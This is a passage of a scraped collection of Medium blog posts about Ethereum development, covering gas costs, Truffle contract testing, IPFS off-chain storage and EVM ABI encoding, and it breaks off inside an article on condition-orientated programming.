gereken GAS miktar\u0131 da ona oranla art\u0131yor. Bu GAS de\u011feri de i\u015flemi \u00e7al\u0131\u015ft\u0131ran madenciye o anda i\u015flemci g\u00fcc\u00fcn\u00fc kulland\u0131\u011f\u0131 i\u00e7in \u00f6d\u00fcl olarak g\u00f6nderiliyor. \u00d6rne\u011fin bir ak\u0131ll\u0131 kontrat\u0131n bir hesap yap\u0131p ya da kural \u00e7al\u0131\u015ft\u0131r\u0131p Ether ya da bir token transferi yapmas\u0131 yeni bir kontrat durumu yani \u2018state\u2019 olu\u015fturaca\u011f\u0131 i\u00e7in bunun i\u00e7in belli bir miktar GAS \u00f6demesi gerekirken mevcut bir kontrat\u0131n o andaki durumunun okunmas\u0131 yeni bir \u2018state\u2019 olu\u015fturmayaca\u011f\u0131 i\u00e7in \u00fccretsiz ger\u00e7ekle\u015febiliyor.Umar\u0131m Ethereum a\u011f\u0131 hakk\u0131nda a\u015fa\u011f\u0131 yukar\u0131 bir bilginiz olu\u015fmaya ba\u015flam\u0131\u015ft\u0131r. Merkezi olmayan uygulamalar ve arac\u0131lar\u0131n olmad\u0131\u011f\u0131 bir transparan bir finansal sistem \u00e7ok de\u011fi\u015fik f\u0131rsatlar\u0131 da ortaya \u00e7\u0131kart\u0131yor. Bu f\u0131rsatlardan bir tanesi de ICO (Initial Coin Offering) denilen bamba\u015fka bir crowfunding modeli. \u015eu anda bu yaz\u0131da bu konuya \u00e7ok fazla giremesem de bir sonraki yaz\u0131mda bunun avantajlar\u0131n\u0131 ve nas\u0131l \u00e7al\u0131\u015ft\u0131\u011f\u0131n\u0131 bir ka\u00e7 \u00f6rnek ile a\u00e7\u0131klamay\u0131 planl\u0131yorum.Bu s\u0131rada e\u011fer akl\u0131n\u0131za tak\u0131lan bir konu varsa l\u00fctfen benimle ileti\u015fime ge\u00e7mekten \u00e7ekinmeyin! (twitter: @MertSusur) T\u00fcrkiye\u2019de hen\u00fcz sadece \u2018k\u0131sa yoldan k\u00f6\u015feyi nas\u0131l d\u00f6nerimcilikten\u2019 \u00f6teye gitmeyece\u011fini d\u00fc\u015f\u00fcnen b\u00fcy\u00fck bir topluluk varken \u2018yeni internet\u2019 diyebilece\u011fim kadar \u00f6nemli oldu\u011funu d\u00fc\u015f\u00fcnd\u00fc\u011f\u00fcm bu teknolojinin \u00fclkemizde geli\u015fmesi i\u00e7in hep beraber bir \u015feyler yapabiliriz.ICO kavramindan ve kullanim alanlarindan bahsettigim yazima da goz atmayi unutmayin.Esen kal\u0131n!", "responses": 5, "tags": ["Ethereum", "Blockchain", "Solidity", "Dapps"]}, {"title": "Testing Your Smart Contracts With JavaScript (Including Async/Await Promises)", "post_link": "https://medium.com/@gus_tavo_guim/testing-your-smart-contracts-with-javascript-40d4edc2abed?source=search_post", "author_name": "Gustavo (Gus) Guimaraes", "author_link": "https://medium.com/@gus_tavo_guim", "publish_date": "2017-10-21", "last_modified_date": "2018-06-21", "readtime": "4.16", "claps": 835, "voters": 124, "content": "Testing Your Smart Contracts With JavaScript (Including Async/Await Promises)Gustavo (Gus) GuimaraesFollowOct 21, 2017 \u00b7 5 min read[ The code for this blog post can be found here: https://github.com/gustavoguimaraes/smart-contract-testing-javascript-example-]Smart contract developers strive to mitigate bugs in their code as they can be literally costly. For this end, one of the techniques we use is to write tests extensively or dare I say obsessively to the codebase.In this post I will show you how to start testing your smart contracts from the get go.Show me the green light to move forwardFirst off, these are the dependencies I used to create this tutorial. If you come across an error, you can try installing and using these versions.- node@8.5.0- truffle@^4.0.0- ethereumjs-testrpc@^4.0.1With the dependencies out of the way, let\u2019s set up the project.mkdir smart-contract-test-example && cd \"$_\" && truffle init webpackThe snippet above creates a directory, changes into it and initializes Truffle with webpack.Now create the test file for the FundRaise smart contract we\u2019ll build.touch test/fundRaise.jsOpen the file in your favorite text editor and add the most basic test structure.const FundRaise = artifacts.require('./FundRaise.sol')contract('FundRaise', function () {})They first line fetches the contract artifacts. It is the contract abstraction containing its primary information i.e. its ABI, address and the like.Then we create the function contract() which is similar to the describe() function in Mocha, except that Truffle adds some features such as making sure the contracts are deployed before running the tests. By the way, Truffle uses the Mocha testing framework as well as Chai assertion library under the hood.Now let\u2019s run this barebones test.First:testrpcThen open a new command line window and typetruffle test test/fundRaise.jsThe outcome is:Error: Could not find artifacts for ./FundRaise.sol from any sources    at Resolver.require (/usr/local/lib/node_modules/truffle/build/cli.bundled.js:49072:9)    at TestResolver.require (/usr/local/lib/node_modules/truffle/build/cli.bundled.js:89733:30)...This is because we haven\u2019t coded up the FundRaise smart contract just yet. Let\u2019s fix this.touch contracts/FundRaise.solThen add the codepragma solidity ^0.4.17;contract FundRaise {}Run the test again: 0 passing (1ms)Right. No tests written yet.Smart Contract Specification and Adding TestsThe FundRaise smart contract will be a simple contract. Its straightforward specification is:it has an ownerit accepts fundsit is able to pause and un-pause the fundraising activitycontract owner is able to remove funds from the contract to herself at any time.Let\u2019s start with the first specification \u2014 the contract has a ownerconst FundRaise = artifacts.require('./FundRaise.sol')contract('FundRaise', function ([owner]) {    let fundRaise    beforeEach('setup contract for each test', async function () {        fundRaise = await FundRaise.new(owner)    })    it('has an owner', async function () {        assert.equal(await fundRaise.owner(), owner)    })})In the test code above we accomplish a few things.1- fancy ES2015 destructuring variable assignment in function([owner] the first parameter given to the contract function is an array with the accounts\u00a0coming\u00a0from\u00a0testrpc. We are taking the first one and assigning it the variable owner\u00a0.2- create the fundRaise variable3- have a beforeEach function which will run before each test creating a new instance of fundRaise each time. Note the use of async/await for promises. This allows for more readable test code. If you want to read up more on the new JavaScript async/await features, this is a good blog post on it.4- create the first test within the it() function block. Here we are asserting that the fundRaise.owner() is the owner that we passed to when creating the contract.Before running the tests once more, head over to truffle.js and require babel-polyfill as we need it to use async/await.truffle.js// Allows us to use ES6 in our migrations and tests.require('babel-register')require('babel-polyfill')module.exports = {  networks: {    development: {      host: 'localhost',      port: 8545,      network_id: '*' // Match any network id    }  }}Run the tests again and you will find this error:...1 failing1) Contract: FundRaise has an owner:     AssertionError: expected undefined to equal '0x676c48fb3979cf2e47300e8ce80a99087589650d'...Now it is time to write the code that will make the first test pass. Let\u2019s flesh out our smart contract a bit.pragma solidity ^0.4.17;contract FundRaise {    address public owner;    // @dev constructor function. Sets contract owner     function FundRaise() {        owner = msg.sender;    }}Trigger the test again, i.e.truffle test test/fundRaise.js\u00a0:Contract: FundRaise    \u2713 has an owner (41ms)1 passing (138ms)Great! Let\u2019s move on and add the next one.const FundRaise = artifacts.require('./FundRaise.sol')  contract('FundRaise', function ([owner, donor]) {    let fundRaise    beforeEach('setup contract for each test', async function () {      fundRaise = await FundRaise.new(owner)    })    it('has an owner', async function () {      assert.equal(await fundRaise.owner(), owner)    })    it('is able to accept funds', async function () {      await fundRaise.sendTransaction({ value: 1e+18, from: donor })      const fundRaiseAddress = await fundRaise.address      assert.equal(web3.eth.getBalance(fundRaiseAddress).toNumber(), 1e+18)    })})The error this time is:1 failing1) Contract: FundRaise is able to accept funds:     Error: VM Exception while processing transaction: invalid opcodeRight, we need to let our contract receive Ether. Let\u2019s fix that.pragma solidity ^0.4.17;contract FundRaise {    address public owner;// @dev constructor function. Sets contract owner     function FundRaise() {        owner = msg.sender;    }        // fallback function that allows contract to accept ETH     function () payable {}}And the result is:Contract: FundRaise    \u2713 has an owner (38ms)    \u2713 is able to accept funds (234ms)2 passing (473ms)Beautiful. This is the process one goes through systematically to cover the smart contracts with test\u00a0written\u00a0in\u00a0JavaScript. Just keep doing this process until all smart contract specifications are met.For simplicity sake, I am going to fast forward the process and add the complete set of tests for the FundRaise contract so you have an idea how it would look like in the end.Note the tests for the pause/unpause and owner receive funds testsand here is the full code for the smart contract:Run the tests one last time\u2026Contract: FundRaise    \u2713 has an owner (46ms)    \u2713 accepts funds (193ms)    \u2713 is able to pause and unpause fund activity (436ms)    \u2713 permits owner to remove funds (653ms)4 passing (2s)Marvelous!Hope you learned a thing or two about testing smart contracts with JavaScript and its use in blockchain development. Now carry on and keep testing the heck out of your smart contracts.The code for this blog post can be found here: https://github.com/gustavoguimaraes/smart-contract-testing-javascript-example-", "responses": 8, "tags": ["JavaScript", "Solidity", "Ethereum", "Ethereum Blockchain", "Software Testing"]}, {"title": "Off-Chain Data Storage: Ethereum & IPFS", "post_link": "https://medium.com/@didil/off-chain-data-storage-ethereum-ipfs-570e030432cf?source=search_post", "author_name": "Adil H", "author_link": "https://medium.com/@didil", "publish_date": "2017-10-17", "last_modified_date": "2018-06-17", "readtime": "2.43", "claps": 561, "voters": 122, "content": "Off-Chain Data Storage: Ethereum & IPFSSaving on gasAdil HFollowOct 17, 2017 \u00b7 3 min readThe Ethereum gas costs issueMost Decentralized Apps running on the Ethereum Platform need to store/retrieve data, just like conventional or \u201ccentralized\u201d apps do using PostgreSQL, MongoDB, Redis, etc. The EVM (Ethereum Virtual Machine) does indeed allow us to save variables/state in permanent storage. Let\u2019s look at this simple Solidity contract:pragma solidity ^0.4.17;contract Database {    bytes x;    function write(bytes _x) public {      x = _x;    }        function read() public view returns (bytes) {      return x;    }}I\u2019ve deployed this contract on Rinkeby test net and generated 1024 of random bytes using https://www.random.org then stored 1kB of data using the write function. The resulting transaction can be seen here : https://rinkeby.etherscan.io/tx/0x6575badcafbc4db521e82904fa14b04bd8e862de1c82f62e064e699d0f90ebe3The Gas used amounted to 754,365 @ 20Gwei Gas price = 0.0150873 Ether. At the time of writing this post (Oct 17, 2017) the Ether price is currently 328.79 USD/ETH. So storing 1kB of data would have cost $4.96 to run on the Ethereum Main Net. That means ~ 5 Million USD / GB !AlternativesSaving a few bytes to the EVM is ok but for larger chunks of data the costs are probably too high for most projects. One solution is to modify our data storage strategy and save the data off-chain (as opposed to the on-chain approach we took above). There are multiple off-chain storage options: IPFS and Swarm are 2 popular ones. I\u2019ll use IPFS in this post but Swarm works equally well.Enter IPFSLooking at the wikipedia article on IPFS :InterPlanetary File System (IPFS) is a protocol designed to create a permanent and decentralized method of storing and sharing filesIPFS allows p2p storage and we can use it as a distributed file system to store data.Low Cost Data Storage StrategySaving data on IPFS provides a unique hash. Instead of storing the data on the contract, we\u2019ll only store the hash on the contract and then we can use the hash to retrieve the data.In production we\u2019d need to create our own IPFS node, but INFURA provides a node for developers which we can use for free.Here is a js snippet you can try out on https://npm.runkit.com/ to save data to IPFS :const IPFS = require(\u2018ipfs-mini\u2019);const ipfs = new IPFS({host: \u2018ipfs.infura.io\u2019, port: 5001, protocol: \u2018https\u2019});const randomData = \u201c8803cf48b8805198dbf85b2e0d514320\u201d; // random bytes for testingipfs.add(randomData, (err, hash) => { if (err) {   return console.log(err); }  console.log(\u201cHASH:\u201d, hash);});this should return the hash \u201cQmaj3ZhZtHynXc1tpnTnSBNsq8tZihMuV34wAvpURPZZMs\u201d which we can use to query our data:const IPFS = require(\u2018ipfs-mini\u2019);const ipfs = new IPFS({host: \u2018ipfs.infura.io\u2019, port: 5001, protocol: \u2018https\u2019});const hash = \u201cQmaj3ZhZtHynXc1tpnTnSBNsq8tZihMuV34wAvpURPZZMs\u201d;ipfs.cat(hash, (err, data) => { if (err) {   return console.log(err); }  console.log(\u201cDATA:\u201d, data);});and this should return our data : \u201c8803cf48b8805198dbf85b2e0d514320\u201dOne remark is that the hash string size is independent of the data size, which means we can store large data chunks or files on IPFS (I couldn\u2019t find a current size restriction) without increasing our Ethereum transaction costs !I\u2019ve used our previous contract to store the IPFS hash generated above :https://rinkeby.etherscan.io/tx/0x53ae68a0f7302d8808d836c560f54f83b2b870f02b136338c8abde03f2e3cfb9The gas usage has decreased to 40,907 @ 20Gwei Gas price = 0.00081814 Ether = 0.27 USDWe now have a much more acceptable storage cost and it should be pretty much constant independently of what we\u2019re storing on IPFS !Example Project: Stone DappI\u2019ve built a small proof-of-concept project around this idea called Stone Dapp, feel free to check it out :Github : https://github.com/didil/stone-dappLive version (Rinkeby) : https://stone-dapp.firebaseapp.comP.S.: In the examples above I\u2019ve set the Gas Price to 20 GWei. To help you choose the Gas Price you want to pay, you could check out http://ethgasstation.info . ETH Gas Station provides transaction confirmation time estimates and other useful network stats.", "responses": 8, "tags": ["Ethereum", "Blockchain", "Ipfs", "Solidity", "Storage"]}, {"title": "How To Decipher A Smart Contract Method Call", "post_link": "https://medium.com/@hayeah/how-to-decipher-a-smart-contract-method-call-8ee980311603?source=search_post", "author_name": "Howard", "author_link": "https://medium.com/@hayeah", "publish_date": "2017-09-18", "last_modified_date": "2018-07-22", "readtime": "10.9", "claps": 1206, "voters": 120, "content": "How To Decipher A Smart Contract Method CallHowardFollowSep 18, 2017 \u00b7 11 min readDiving Into The Ethereum VM Part 4In previous articles of this series we\u2019ve seen how Solidity represents complex data structures in the EVM storage. But data is useless if there\u2019s no way to interact with it. The Smart Contract is the mediator between data and the outside world.In this article we\u2019ll see how Solidity and EVM makes it possible for external programs to call a contract\u2019s methods and cause its state to change.The \u201cexternal program\u201d is not limited to DApp/JavaScript. Any program that can communicate with an Ethereum node using HTTP RPC can interact with any contract deployed on the blockchain by creating transactions.Creating a transaction is like making an HTTP request. A web server would accept your HTTP request and make changes to the database. A transaction would be accepted by the network, and the underlying blockchain extended to include the state changes.Transactions are to Smart Contracts as HTTP requests are to web services.If EVM assembly and Solidity data representation are unfamiliar, see previous articles of this series to learn more:Introduction to the EVM assembly code.How fixed-length data types are represented.How dynamic data types are represented.Contract TransactionLet\u2019s look at a transaction that sets a state variable to 0x1. The contract we want to interact with has a setter and a getter for the variable a:pragma solidity ^0.4.11;contract C {  uint256 a;  function setA(uint256 _a) {    a = _a;  }  function getA() returns(uint256) {    return a;  }}This contract is deployed on the test network Rinkeby. Feel free to inspect it using Etherscan at the address 0x62650ae5\u2026.I\u2019ve created a transaction that makes the call setA(1). Inspect this transaction at the address 0x7db471e5....The transaction\u2019s input data is:0xee919d500000000000000000000000000000000000000000000000000000000000000001To the EVM, this is just 36 bytes of raw data. It is passed to the Smart Contract unprocessed as calldata. If the Smart Contact is a Solidity program, then it interprets these input bytes as a method call, and executes the appropriate assembly code for setA(1).The input data can be broken down to two subparts:# The method selector (4 bytes)0xee919d5# The 1st argument (32 bytes)00000000000000000000000000000000000000000000000000000000000000001The first four bytes is the method selector. The rest of the input data are method arguments in chunks of 32 bytes. In this case there is only 1 argument, the value0x1.The method selector is the kecccak256 hash of the method signature. In this case the method signature is setA(uint256), which is the name of the method and the types of its arguments.Let\u2019s calculate the method selector in Python. First, hash the method signature:# Install pyethereum https://github.com/ethereum/pyethereum/#installation> from ethereum.utils import sha3> sha3(\"setA(uint256)\").hex()'ee919d50445cd9f463621849366a537968fe1ce096894b0d0c001528383d4769'Then take the first 4 bytes of the hash:> sha3(\"setA(uint256)\")[0:8].hex()'ee919d50'Note: each byte is represented by 2 characters in a Python hex stringThe Application Binary Interface (ABI)As far as the EVM is concerned, the transaction\u2019s input data (calldata) is just a sequence of bytes. The EVM doesn\u2019t have builtin support for calling methods.A smart contract can choose to simulate a method call by processing the input data in a structured way, as shown in the previous section.If languages on the EVM all agree on how input data should be interpreted, then they can easily interoperate with each other. The Contract Application Binary Interface (The ABI) specifies a common encoding scheme.We\u2019ve seen how the ABI encodes a simple method call like setA(1). In later sections we\u2019ll see how method calls with more complex arguments are encoded.Calling A GetterIf the method you are calling changes the state, then the entire network has to agree. This would requires a transaction, and costs you gas.A getter method like getA() doesn\u2019t change anything. Instead of asking the whole network to carry out the computation, we can send the method call to a local Ethereum node. An eth_call RPC request allows you to simulate a transaction locally. This is useful for read-only method or gas usage estimation.An eth_call is like a cached HTTP GET request.It doesn\u2019t change the global consensus state.The local blockchain (\u201ccache\u201d) may be slightly outdated.Let\u2019s make an eth_call to invoke the getA method, getting the state a in return. First, calculate the method selector:>>> sha3(\"getA()\")[0:8].hex()'d46300fd'Since there is no argument, the input data is just the method selector by itself. We can send an eth_call request to any Ethereum node. For this example, we will send the request to a public Ethereum node hosted by infura.io:$ curl -X POST \\-H \"Content-Type: application/json\" \\\"https://rinkeby.infura.io/YOUR_INFURA_TOKEN\" \\--data '{  \"jsonrpc\": \"2.0\",  \"id\": 1,  \"method\": \"eth_call\",  \"params\": [    {      \"to\": \"0x62650ae5c5777d1660cc17fcd4f48f6a66b9a4c2\",      \"data\": \"0xd46300fd\"    },    \"latest\"  ]}'The EVM carries out the computation and returns raw bytes as the result:{\"jsonrpc\":\"2.0\",\"id\":1,        \"result\":\"0x0000000000000000000000000000000000000000000000000000000000000001\"}According to the ABI, the bytes should be interpreted as the value 0x1.Assembly For External Method CallingNow let\u2019s see how the compiled contract processes the raw input data to make a method call. Consider a contract that defines setA(uint256):pragma solidity ^0.4.11;contract C {  uint256 a;  // Note: `payable` makes the assembly a bit simpler  function setA(uint256 _a) payable {    a = _a;  }}Compile:solc --bin --asm --optimize call.solThe assembly code for the methods being called is in the body of the contract, organized under sub_0:sub_0: assembly {    mstore(0x40, 0x60)    and(div(calldataload(0x0), 0x100000000000000000000000000000000000000000000000000000000), 0xffffffff)    0xee919d50    dup2    eq    tag_2    jumpi  tag_1:    0x0    dup1    revert  tag_2:    tag_3    calldataload(0x4)    jump(tag_4)  tag_3:    stop  tag_4:      /* \"call.sol\":95:96  a */    0x0      /* \"call.sol\":95:101  a = _a */    dup2    swap1    sstore  tag_5:    pop    jump // outauxdata: 0xa165627a7a7230582016353b5ec133c89560dea787de20e25e96284d67a632e9df74dd981cc4db7a0a0029}There are two pieces of boilerplate code that are irrelevant to this discussion, but FYI:mstore(0x40, 0x60) at the very top reserves the first 64 bytes in memory for sha3 hashing. This is always there whether the contract needs it or not.auxdata at the very bottom is used to verify that the published source code is the same as the deployed bytecode. This is optional, but baked into the compiler.Let\u2019s break the remaining assembly code to two parts for easier analysis:Matching the selector and jumping to a method.Loading the arguments, executing method, and returning from method.First, the annotated assembly for matching the selector:// Load the first 4 bytes as method selectorand(div(calldataload(0x0), 0x100000000000000000000000000000000000000000000000000000000), 0xffffffff)// if selector matches `0xee919d50`, goto setA0xee919d50dup2eqtag_2jumpi// No matching method. Fail & revert.tag_1:  0x0  dup1  revert// Body of setAtag_2:  ...It\u2019s straightforward except for the bit-shuffling at the beginning to load 4 bytes from call data. For clarity, the assembly logic in low-level pseudocode is like:methodSelector = calldata[0:4]if methodSelector == \"0xee919d50\":  goto tag_2 // goto setAelse:  // No matching method. Fail & revert.  revertThe annotated assembly for the actual method call:// setAtag_2:  // Where to goto after method call  tag_3  // Load first argument (the value 0x1).  calldataload(0x4)  // Execute method.  jump(tag_4)tag_4:  // sstore(0x0, 0x1)  0x0  dup2  swap1  sstoretag_5:  pop  // end of program, will goto tag_3 and stop  jumptag_3:  // end of program  stopBefore entering into the method body, the assembly does two things:Saves the position to return to after method call.Loads the arguments from call data onto the stack.In low-level pseudocode:// Saves the position to return to after method call.@returnTo = tag_3tag_2: // setA  // Loads the arguments from call data onto the stack.  @arg1 = calldata[4:4+32]tag_4: // a = _a  sstore(0x0, @arg1)tag_5 // return  jump(@returnTo)tag_3:  stopCombining the two parts together:methodSelector = calldata[0:4]if methodSelector == \"0xee919d50\":  goto tag_2 // goto setAelse:  // No matching method. Fail.  revert@returnTo = tag_3tag_2: // setA(uint256 _a)  @arg1 = calldata[4:36]tag_4: // a = _a  sstore(0x0, @arg1)tag_5 // return  jump(@returnTo)tag_3:  stopFun trivia: The opcode for revert is fd. But you won't find specification for it in the Yellow Paper, or implementation in code. In fact, fd doesn't actually exist! It's an invalid op. When the EVM encounters an invalid op, it gives up and revert state as a side-effect.Handling Multiple MethodsHow does the Solidity compiler generate assembly for a contract that has multiple methods?pragma solidity ^0.4.11;contract C {    uint256 a;    uint256 b;    function setA(uint256 _a) {      a = _a;    }    function setB(uint256 _b) {      b = _b;    }}Simple. Just more if-else branches one after another:// methodSelector = calldata[0:4]and(div(calldataload(0x0), 0x100000000000000000000000000000000000000000000000000000000), 0xffffffff)// if methodSelector == 0x9cdcf9b0x9cdcf9bdup2eqtag_2 // SetBjumpi// elsif methodSelector == 0xee919d50dup10xee919d50eqtag_3 // SetAjumpiIn pseudocode:methodSelector = calldata[0:4]if methodSelector == \"0x9cdcf9b\":  goto tag_2elsif methodSelector == \"0xee919d50\":  goto tag_3else:  // Cannot find a matching method. Fail.  revertABI Encoding For Complex Method CallsDon\u2019t worry about the zeros. It\u2019s FINE.For a method call, the first four bytes of the transaction input data is always the method selector. Then the method arguments follow in chunks of 32 bytes. The ABI Encoding Specification details how the more complex types of arguments are encoded, but it can be extremely painful to read.Another strategy to learn the ABI encoding is to use the pyethereum\u2019s ABI encoding function to investigate how different types of data are encoded. We\u2019ll start from simple cases, and build up to more complex types.First, import the encode_abi function:from ethereum.abi import encode_abiFor a method that has three uint256 arguments (e.g. foo(uint256 a, uint256 b, uint256 c)), the encoded arguments are simply uint256 numbers one after another:# The first array lists the types of the arguments.# The second array lists the argument values.> encode_abi([\"uint256\", \"uint256\", \"uint256\"],[1, 2, 3]).hex()000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003Types smaller than 32 bytes are padded to 32 bytes:> encode_abi([\"int8\", \"uint32\", \"uint64\"],[1, 2, 3]).hex()000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003For fix-sized arrays, the elements are again 32 bytes chunks (zero padded if necessary), laid out one after another:> encode_abi(   [\"int8[3]\", \"int256[3]\"],   [[1, 2, 3], [4, 5, 6]]).hex()// int8[3]. Zero-padded to 32 bytes.000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003// int256[3].000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000006ABI Encoding for Dynamic ArraysThe ABI introduces an layer of indirection to encode dynamic arrays, following a scheme called head-tail encoding.The idea is that the elements of the dynamic arrays are packed at the tail-end of the transaction\u2019s calldata. The arguments (the \u201chead\u201d ) are references into the calldata where the array elements are.If we call a method with 3 dynamic arrays, the arguments are encoded like this (comments and line breaks added for clarity):> encode_abi(  [\"uint256[]\", \"uint256[]\", \"uint256[]\"],  [[0xa1, 0xa2, 0xa3], [0xb1, 0xb2, 0xb3], [0xc1, 0xc2, 0xc3]]).hex()/************* HEAD (32*3 bytes) *************/// arg1: look at position 0x60 for array data0000000000000000000000000000000000000000000000000000000000000060// arg2: look at position 0xe0 for array data00000000000000000000000000000000000000000000000000000000000000e0// arg3: look at position 0x160 for array data0000000000000000000000000000000000000000000000000000000000000160/************* TAIL (128**3 bytes) *************/// position 0x60. Data for arg1.// Length followed by elements.000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000a100000000000000000000000000000000000000000000000000000000000000a200000000000000000000000000000000000000000000000000000000000000a3// position 0xe0. Data for arg2.000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000b100000000000000000000000000000000000000000000000000000000000000b200000000000000000000000000000000000000000000000000000000000000b3// position 0x160. Data for arg3.000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000c100000000000000000000000000000000000000000000000000000000000000c200000000000000000000000000000000000000000000000000000000000000c3So the head section has three 32 bytes arguments, pointing to locations in the tail section, which contains the actual data for the three dynamic arrays.For example, the first argument is 0x60, pointing to the 96th (0x60) byte of the calldata. If you look at the 96th byte, it is the beginning of an array. The first 32 bytes is the length, followed by three elements.It is possible to mix dynamic and static arguments. Here\u2019s an example with (static, dynamic, static) arguments. The static arguments are encoded as is, whereas the data for the second dynamic array is placed in the tail section:> encode_abi(  [\"uint256\", \"uint256[]\", \"uint256\"],  [0xaaaa, [0xb1, 0xb2, 0xb3], 0xbbbb]).hex()/************* HEAD (32*3 bytes) *************/// arg1: 0xaaaa000000000000000000000000000000000000000000000000000000000000aaaa// arg2: look at position 0x60 for array data0000000000000000000000000000000000000000000000000000000000000060// arg3: 0xbbbb000000000000000000000000000000000000000000000000000000000000bbbb/************* TAIL (128 bytes) *************/// position 0x60. Data for arg2.000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000b100000000000000000000000000000000000000000000000000000000000000b200000000000000000000000000000000000000000000000000000000000000b3Lots of zeros, but it\u2019s fine.Encoding BytesStrings and Byte Arrays are also head-tail encoded. The only difference is that the bytes are packed tightly in chunks of 32 bytes, like so:> encode_abi(  [\"string\", \"string\", \"string\"],  [\"aaaa\", \"bbbb\", \"cccc\"]).hex()// arg1: look at position 0x60 for string data0000000000000000000000000000000000000000000000000000000000000060// arg2: look at position 0xa0 for string data00000000000000000000000000000000000000000000000000000000000000a0// arg3: look at position 0xe0 for string data00000000000000000000000000000000000000000000000000000000000000e0// 0x60 (96). Data for arg100000000000000000000000000000000000000000000000000000000000000046161616100000000000000000000000000000000000000000000000000000000// 0xa0 (160). Data for arg200000000000000000000000000000000000000000000000000000000000000046262626200000000000000000000000000000000000000000000000000000000// 0xe0 (224). Data for arg300000000000000000000000000000000000000000000000000000000000000046363636300000000000000000000000000000000000000000000000000000000For each string/bytearray, the first 32 bytes encodes the length, followed by the bytes.If the string is larger than 32 bytes, then multiple 32 bytes chunks are used:// encode 48 bytes of string dataethereum.abi.encode_abi(  [\"string\"],  [\"a\" * (32+16)]).hex()0000000000000000000000000000000000000000000000000000000000000020// length of string is 0x30 (48)000000000000000000000000000000000000000000000000000000000000003061616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616100000000000000000000000000000000Nested ArraysNested arrays have one indirection per nesting.> encode_abi(  [\"uint256[][]\"],  [[[0xa1, 0xa2, 0xa3], [0xb1, 0xb2, 0xb3], [0xc1, 0xc2, 0xc3]]]).hex()// arg1: The outter array is at position 0x20.0000000000000000000000000000000000000000000000000000000000000020// 0x20. Each element is the position of an inner array.0000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000160// array[0] at 0x60000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000a100000000000000000000000000000000000000000000000000000000000000a200000000000000000000000000000000000000000000000000000000000000a3// array[1] at 0xe0000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000b100000000000000000000000000000000000000000000000000000000000000b200000000000000000000000000000000000000000000000000000000000000b3// array[2] at 0x160000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000c100000000000000000000000000000000000000000000000000000000000000c200000000000000000000000000000000000000000000000000000000000000c3Ya, lots of zeros.Gas Cost & ABI Encoding DesignWhy does the ABI truncate the method selector to only 4 bytes? Could there be unlucky collisions for different methods if we don\u2019t use the full 32 bytes of sha256? If the truncation is to save cost, why bother saving a mere 28 bytes in the method selector if it is wasting way more bytes with zero-padding?These two design choices seem contradictory\u2026 until we consider the gas costs for a transaction.21000 paid for every transaction.4 paid for every zero byte of data or code for a transaction.68 paid for every non-zero byte of data or code for a transaction.Ah ha! Zeros are 17 times cheaper, so zero-padding isn\u2019t as bad as it seems.The method selector is a cryptographic hash, which is pseudorandom. A random string would tend to have mostly non-zero bytes, since each byte only has 0.3% (1/255) chance of being 0.0x1 padded to 32 bytes costs 192 gas.4*31 (zeroes bytes) + 68 (1 non-zero byte)sha256 is likely to have 32 non-zero bytes, which costs about 2176 gas32 * 68sha256 truncated to 4 bytes would cost about 272 gas32 * 4The ABI demonstrates yet another example of quirky low-level design incentivized by the gas cost structure.Negative Integers\u2026Negative integers are usually represented using a scheme called Two\u2019s Complement. The value -1 of the type int8 encoded would be all 1s1111 1111.The ABI pads negative integers with 1s, so -1 would be padded to:ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffSmall negative numbers are mostly 1s, costing you quite a lot of gas.\u00af\\_(\u30c4)_/\u00afConclusionTo interact with a Smart Contract, you send it raw bytes. It does some computation, possibly changing its own state, and then sends you raw bytes in return. Method calling does not actually exist. It is a collective illusion created by the ABI.The ABI is specified like a low-level format, but in function it\u2019s more like a serialization format for a cross-language RPC framework.We could draw analogies between the architectural tiers of DApp and Web App:The blockchain is like the backing database.A contract is like a web service.A transaction is like a request.ABI is the data-interchange format, like Protocol Buffer.If you enjoyed this article, you should follow me on Twitter @hayeah.In this article series about the EVM I write about:Introduction to the EVM assembly code.How fixed-length data types are represented.How dynamic data types are represented.How ABI Encodes External Method Calling.To learn more about the Solidity and EVM, subscribe to my weekly tutorial:", "responses": 7, "tags": ["Ethereum", "Blockchain", "Solidity", "Compilers"]}, {"title": "Condition-Orientated Programming", "post_link": "https://medium.com/@gavofyork/condition-orientated-programming-969f6ba0161a?source=search_post", "author_name": "Gavin Wood", "author_link": "https://medium.com/@gavofyork", "publish_date": "2016-06-26", "last_modified_date": "2018-06-14", "readtime": "5.11", "claps": 388, "voters": 129, "content": "Condition-Orientated ProgrammingGavin WoodFollowJun 26, 2016 \u00b7 6 min readCondition-Orientated Programming (COP) is subdomain of contract-orientated programming, and sits as a hybrid approach between functional and imperative programming. Done properly it is a tool in your arsenal for writing safe, secure contracts. It helps make your contract code comprehensively auditable and \u2014 loosely speaking \u2014 informally provable to have correct run-time operation.COP is not language specific; it is more of a loose methodology than particular syntax. However, with its function modifiers and events, it is particularly well-suited to the Solidity language.Simply put, COP has just one main aim:Function bodies should have no conditional paths.Or alternatively:Never mix transitions with conditions.This may seem like a difficult goal to achieve for an imperative language, since conditional paths are how you achieve the rich state-transitions which allow interesting operational dynamics. To achieve it, we try to split all conditions apart from the state-transitions that they guard. We name each independently and combine to form real functions.The problem with such conditional paths within transition logic is that they add conceptual non-linearity over state semantics. Potential bugs hide when the programmer believes a 